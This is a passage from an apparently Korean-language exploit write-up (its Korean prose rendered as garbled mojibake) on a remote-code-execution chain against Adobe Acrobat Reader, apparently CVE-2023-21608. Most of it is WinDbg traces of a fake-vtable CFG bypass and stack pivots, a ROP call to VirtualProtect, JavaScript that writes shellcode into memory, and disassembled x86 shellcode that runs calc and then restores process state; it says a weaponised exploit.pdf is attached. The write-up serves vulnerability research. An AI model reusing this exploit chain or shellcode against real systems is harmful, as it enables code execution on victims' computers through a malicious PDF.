eax=0c7dd54c ebx=00000001 ecx=63eeaa60 edx=00005000 esi=63eeaa60 edi=63a89990
eip=63a89a41 esp=0457c170 ebp=0457c19c iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
AcroForm!hb_ot_tags_to_script_and_language+0x68fa1:
63a89a41 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:0457c188=10c7d038
0:000> p
eax=0c7dd54c ebx=00000001 ecx=10c7d038 edx=00005000 esi=63eeaa60 edi=63a89990
eip=63a89a44 esp=0457c170 ebp=0457c19c iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
AcroForm!hb_ot_tags_to_script_and_language+0x68fa4:
63a89a44 ffd6            call    esi {AcroForm!DllUnregisterServer+0x42ea00 (63eeaa60)}
```

ì´í›„ í˜¸ì¶œëœ `sub_20EFAA60`ì—ì„œ `mov eax, [ecx]`ê°€ ì‹¤í–‰ë˜ë©´ì„œ ecx(`this`)ê°€ ê°€ë¦¬í‚¤ëŠ” Fake vtableì˜ ì£¼ì†Œ(0x20000158)ê°€ eaxì— ì €ì¥ë©ë‹ˆë‹¤. ì´í›„ `call dword ptr [eax + 30h]`ì— ì˜í•´ Fake vtable + 0x30ì— ì €ì¥ëœ stack pivot ê°€ì ¯ì´ í˜¸ì¶œë©ë‹ˆë‹¤. `sub_20EFAA60`ì—ì„œ ë°œìƒí•˜ëŠ” ê°„ì ‘ í˜¸ì¶œì—ì„œëŠ” CFG ê²€ì‚¬ê°€ ì´ë£¨ì–´ì§€ì§€ ì•Šê¸° ë•Œë¬¸ì— ROP ê°€ì ¯ì„ í˜¸ì¶œí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ê³  ì´ë¥¼ í†µí•´ CFGë¥¼ ìš°íšŒí•©ë‹ˆë‹¤.

```
eax=0c7dd54c ebx=00000001 ecx=10c7d038 edx=00005000 esi=63eeaa60 edi=63a89990
eip=63eeaa60 esp=0457c16c ebp=0457c19c iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
AcroForm!DllUnregisterServer+0x42ea00:
63eeaa60 8b01            mov     eax,dword ptr [ecx]  ds:002b:10c7d038=20000158
0:000> t
eax=20000158 ebx=00000001 ecx=10c7d038 edx=00005000 esi=63eeaa60 edi=63a89990
eip=63eeaa62 esp=0457c16c ebp=0457c19c iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
AcroForm!DllUnregisterServer+0x42ea02:
63eeaa62 6a0d            push    0Dh
0:000> t
eax=20000158 ebx=00000001 ecx=10c7d038 edx=00005000 esi=63eeaa60 edi=63a89990
eip=63eeaa64 esp=0457c168 ebp=0457c19c iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
AcroForm!DllUnregisterServer+0x42ea04:
63eeaa64 ff5030          call    dword ptr [eax+30h]  ds:002b:20000188=63a46984
0:000> u 63a46984
AcroForm!hb_ot_tags_to_script_and_language+0x25ee4:
63a46984 8be0            mov     esp,eax
63a46986 ffc9            dec     ecx
63a46988 c3              ret
```

ê°€ì ¯ì´ ì‹¤í–‰ë˜ë©´ eax(`arrBufPtr + 0x100`)ê°’ì„ espì— ì“°ë©´ì„œ stack pivotì´ ì´ë£¨ì–´ì§€ê³  `ret`í•˜ê²Œ ë˜ëŠ”ë° ì´ë•Œì˜ espì¸ 0x20000158ì—ëŠ” ì•„ë˜ì˜ ë˜ ë‹¤ë¥¸ stack pivot ê°€ì ¯ì˜ ì£¼ì†Œê°€ ì €ì¥ë˜ì–´ ìˆì–´ í•´ë‹¹ ì£¼ì†Œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.

```
eax=20000158 ebx=00000001 ecx=10c7d037 edx=00005000 esi=63eeaa60 edi=63a89990
eip=6380e646 esp=2000015c ebp=0457c19c iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200203
AcroForm+0x1e646:
6380e646 5c              pop     esp
0:000> t
eax=20000158 ebx=00000001 ecx=10c7d037 edx=00005000 esi=63eeaa60 edi=63a89990
eip=6380e647 esp=20000358 ebp=0457c19c iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200203
AcroForm+0x1e647:
6380e647 c3              ret
0:000> dd esp
20000358  757d0760 20000458 20000458 00001000
20000368  00000040 20000598 00000000 00000000
```

ìµœì¢…ì ìœ¼ë¡œ espëŠ” 0x20000358ë¡œ ë°”ë€Œê²Œ ë˜ê³  í•œë²ˆ ë” `ret`í•˜ë©´ì„œ `KERNEL32!VirtualProtectStub` í•¨ìˆ˜ì˜ ì£¼ì†Œë¡œ eipê°€ ë³€ê²½ë˜ê³  pivotëœ ìŠ¤íƒì— êµ¬ì„±ëœ ì¸ìë“¤ì— ì˜í•´ `VirtualProtect(0x20000458, 0x1000, PAGE_EXECUTE_READWRITE, 0x20000598)`ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒê³¼ ê°™ì€ íš¨ê³¼ê°€ ë°œìƒí•©ë‹ˆë‹¤.

## 6. Insert Shellcode

ì‚½ì…ëœ ROP í˜ì´ë¡œë“œì— ì˜í•´ í˜¸ì¶œëœ `VirtualProtect`ëŠ” ì‹¤í–‰ ê¶Œí•œì´ ë¶€ì—¬ëœ 0x20000458ë¡œ ë¦¬í„´í•˜ê³  ì´ ì£¼ì†Œì—ëŠ” ì•„ë˜ì˜ ì½”ë“œì— ì˜í•´ shellcodeê°€ ì‚½ì…ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

```jsx
var shellcode = [
    // recovery prefix       (store reg context)
    // 0x909090CC,
    0x89e083e8, 0x18535256, 0x57505590,

    // shellcode
    835867240, 1667329123, 1415139921, 1686860336, 2339769483, 1980542347, 814448152, 2338274443,
    1545566347, 1948196865, 4270543903, 605009708, 390218413, 2168194903, 1768834421, 4035671071,
    469892611, 1018101719, 2425393296,

    // recovery suffix
    // 0x909090CC,
    /*restore regs*/ 0x58585d58, /*restore vtable*/ 0x8b48608b, 0x50648911, /*pop regs*/ 0x5f5e5a5b,
    /*restore ebp,esp: 0x89ea83ea, 0x3089d490, */ 0x89ec83ec, 0x30909090, /* esi = fn*/ 0x8b706890,
    /*arrbuf restore*/ 0x53bb4000, 0x00208b50, 0x6cc7430c, 0xe8ff0000, 0xc74220e8, 0xff000090,
    0x8953108b, 0x50708913, 0x8b507489, 0x530431d2, 0x5b909090, /*jmp esi*/ 0xffe69090
    /*jmp defaultVal 0xff606890*/
];

for (var i = 0; i < shellcode.length; i++) AAW(arrBufPtr + 0x400 + i * 4, re(shellcode[i]));
```

ì‚½ì…ëœ shellcodeë¥¼ ë””ìŠ¤ì–´ì…ˆë¸”í•œ ê²°ê³¼ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤

```nasm
89e0           mov     eax, esp
83e818         sub     eax, 18h
53             push    ebx
52             push    edx
56             push    esi
57             push    edi
50             push    eax
55             push    ebp
90             nop     
31d2           xor     edx, edx
52             push    edx; 0
6863616c63     push    636C6163h; "calc"
54             push    esp
59             pop     ecx
52             push    edx
51             push    ecx
648b7230       mov     esi, dword ptr fs:[edx+30h]; PEB
8b760c         mov     esi, dword ptr [esi+0Ch]; PEB_LDR_DATA
8b760c         mov     esi, dword ptr [esi+0Ch]; InLoadOrderModuleList
ad             lods    dword ptr [esi]; eax <- AcroRd32.exe's _LDR_DATA_TABLE_ENTRY
8b30           mov     esi, dword ptr [eax]; esi <- KERNEL32.dll's _LDR_DATA_TABLE_ENTRY
8b7e18         mov     edi, dword ptr [esi+18h]; edi <- KERNEL32 dll base
8b5f3c         mov     ebx, dword ptr [edi+3Ch]; ebx <- PE Headaer Offset
8b5c1f78       mov     ebx, dword ptr [edi+ebx+78h]; ebx <- Export Table Offset
8b741f20       mov     esi, dword ptr [edi+ebx+20h]; esi <- Name Pointer Table offset
01fe           add     esi, edi; add KERNEL32 base to esi(Name Pointer Table addr)
8b541f24       mov     edx, dword ptr [edi+ebx+24h]; edx <- Ordinal Table Offset
0fb72c17       movzx   ebp, word ptr [edi+edx]; ebp <- Ordinal Number
42             inc     edx
42             inc     edx; move to next
ad             lods    dword ptr [esi]; Function name offset
813c0757696e45 cmp     dword ptr [edi+eax], 456E6957h; compare Function_Name with "WinE"
75f0           jne     20000491; if WinExec Found, no jump
8b741f1c       mov     esi, dword ptr [edi+ebx+1Ch]; esi <- Address Table Offset
01fe           add     esi, edi; esi <- Address Table addr
033cae         add     edi, dword ptr [esi+ebp*4]; edi <- edi(KERNEL32 base) + WinExec Offset
ffd7           call    edi; WinExec("calc", 0)
```

ì´ëŠ” `WinExec("calc", 0)`ë¥¼ í˜¸ì¶œí•˜ëŠ” Windows x86 ëŒ€ìƒ Universal Shellcodeë¡œ ê³„ì‚°ê¸° í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ì—¬ RCE ìµìŠ¤í”Œë¡œì‡ì„ ì¦ëª…í•©ë‹ˆë‹¤.

ë§ˆì§€ë§‰ìœ¼ë¡œ `WinExec`ê°€ ë¦¬í„´í•œ ë‹¤ìŒì—ëŠ” ì•„ë˜ì™€ ê°™ì€ shellcodeê°€ ì‹¤í–‰ë˜ì–´ shellcodeì— ì‚¬ìš©ëœ ë ˆì§€ìŠ¤í„°ë¥¼ ë³µêµ¬í•˜ê³  ë³€ì¡°ëœ `ArrayBuffer`ì˜ length, `f0`ì˜ vtable ì£¼ì†Œ,  pivotëœ ìŠ¤íƒ ë“±ì„ ë³µì›í•©ë‹ˆë‹¤. ì´í›„ ì‚¬ì „ì— ë©”ëª¨ë¦¬ì— ì €ì¥í•´ë‘” `defaultValue` í•¨ìˆ˜ì˜ ì£¼ì†Œë¡œ `jmp`í•˜ì—¬ ìµìŠ¤í”Œë¡œì‡ì´ ì„±ê³µí•œ í›„ì—ë„ í”„ë¡œì„¸ìŠ¤ì—ì„œ í¬ë˜ì‹œê°€ ë°œìƒí•˜ì§€ ì•Šê²Œ ë§Œë“­ë‹ˆë‹¤.

```nasm
200004b0 58             pop     eax
200004b1 58             pop     eax
200004b2 5d             pop     ebp
200004b3 58             pop     eax
200004b4 8b4860         mov     ecx, dword ptr [eax+60h]
200004b7 8b5064         mov     edx, dword ptr [eax+64h]
200004ba 8911           mov     dword ptr [ecx], edx
200004bc 5f             pop     edi
200004bd 5e             pop     esi
200004be 5a             pop     edx
200004bf 5b             pop     ebx
200004c0 89ec           mov     esp, ebp
200004c2 83ec30         sub     esp, 30h
200004c5 90             nop     
200004c6 90             nop     
200004c7 90             nop     
200004c8 8b7068         mov     esi, dword ptr [eax+68h]
200004cb 90             nop     
200004cc 53             push    ebx
200004cd bb40000020     mov     ebx, 20000040h
200004d2 8b506c         mov     edx, dword ptr [eax+6Ch]
200004d5 c7430ce8ff0000 mov     dword ptr [ebx+0Ch], 0FFE8h
200004dc c74220e8ff0000 mov     dword ptr [edx+20h], 0FFE8h
200004e3 90             nop     
200004e4 895310         mov     dword ptr [ebx+10h], edx
200004e7 8b5070         mov     edx, dword ptr [eax+70h]
200004ea 8913           mov     dword ptr [ebx], edx
200004ec 8b5074         mov     edx, dword ptr [eax+74h]
200004ef 895304         mov     dword ptr [ebx+4], edx
200004f2 31d2           xor     edx, edx
200004f4 5b             pop     ebx
200004f5 90             nop     
200004f6 90             nop     
200004f7 90             nop     
200004f8 ffe6           jmp     esi
```

ROP í˜ì´ë¡œë“œì™€ Shellcodeì˜ ì‹¤í–‰ì€ ì•„ë˜ì˜ ì½”ë“œë¥¼ í†µí•´ `f0`ì˜ Fake vtableì˜ `defaultValue`í•¨ìˆ˜ì— í•´ë‹¹í•˜ëŠ” `sub_20EFAA60`ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒìœ¼ë¡œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. ë˜í•œ í¬ë˜ì‹œ ë“± ì˜ë„ì¹˜ ì•Šì€ ë™ì‘ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ë³€ì¡°í•œ `targetStr`ê³¼ `targetDV`ë¥¼ ì›ë˜ì˜ ì£¼ì†Œë¡œ ë³µì›í•©ë‹ˆë‹¤.

```jsx
corruptedTypedArr[arrStart + 6] = originalTargetStrAddr;
//corruptedTypedArr[FAKE_DV_START+20] = originalDVBackingStore;
corruptedTypedArr[arrStart + 8] = originalTargetDVAddr;

var x = f0.defaultValue;
```

ì „ì²´ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œëŠ” `exploit.js`íŒŒì¼ë¡œ ë³´ê³ ì„œì™€ í•¨ê»˜ ì²¨ë¶€ë˜ì–´ ìˆìœ¼ë©° `exploit.pdf`ì—ëŠ” í•´ë‹¹ JavaScript ì½”ë“œê°€ ì„ë² ë“œë˜ì–´ ìˆì–´ ì·¨ì•½í•œ ë²„ì „ì˜ Acrobatì´ë‚˜ Acrobat Readerë¡œ ì—´ ê²½ìš° ìœ„ ê³¼ì •ì„ í†µí•´ RCEê°€ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤.

ë“œë””ì–´!â€¦ ìµìŠ¤í”Œë¡œì‡ì´ ëë‚¬ìŠµë‹ˆë‹¤â€¦ ìë°”ìŠ¤í¬ë¦½íŠ¸ëŠ” ì •ë§ ì‰½ì§€ ì•Šë„¤ìš”â€¦ ì‹œì—° ë°ëª¨ê¹Œì§€ë§Œ ë³´ì—¬ë“œë¦¬ê³  ë§ˆì¹˜ë„ë¡í•˜ì£ !

<iframe width="560" height="315" src="https://www.youtube.com/embed/f3RObd6h2qw?si=l7WAeyWgGJ_MuCWp" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

# Fini

ìë°”ìŠ¤í¬ë¦½íŠ¸ì™€ ê´€ë ¨ëœ ì·¨ì•½ì ì€ ì²˜ìŒì´ì—ˆëŠ”ë° ì •ë§ ì‰½ì§€ ì•Šë„¤ìš”â€¦ ì´ëŸ° ì·¨ì•½ì ì„ ë§ˆêµ¬ ì°¾ëŠ” ì‚¬ëŒë“¤ì€ ëŒ€ì²´ ë­í•˜ëŠ” ì‚¬ëŒë“¤ì¼ê¹Œ ì‹¶ìŠµë‹ˆë‹¤ ã…‹ã…‹ã…‹ã…‹ã…‹ ì°¸ê³ í• ë§Œí•œ ì¢‹ì€ ë ˆí¼ëŸ°ìŠ¤ê°€ ìˆì–´ì„œ ì‰½ê²Œ?â€¦ ë¶„ì„í•  ìˆ˜ ìˆì—ˆëŠ”ë° íŒ¨ì¹˜ ë¶„ì„ ë‚´ìš©ì€ ì—†ì–´ì„œ ì§ì ‘ ë¶„ì„í•´ë³´ë©´ì„œ ì¬ë°Œê¸°ë„ í–ˆê³ ìš” ì‹œê°„ë§Œ ìˆë‹¤ë©´ ì•ìœ¼ë¡œë„ ì´ëŸ° ê¸€ ë§ì´ ì¨ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!

# Reference

- [https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608](https://hacksys.io/blogs/adobe-reader-resetform-cagg-rce-cve-2023-21608)
- [https://github.com/hacksysteam/CVE-2023-21608](https://github.com/hacksysteam/CVE-2023-21608)
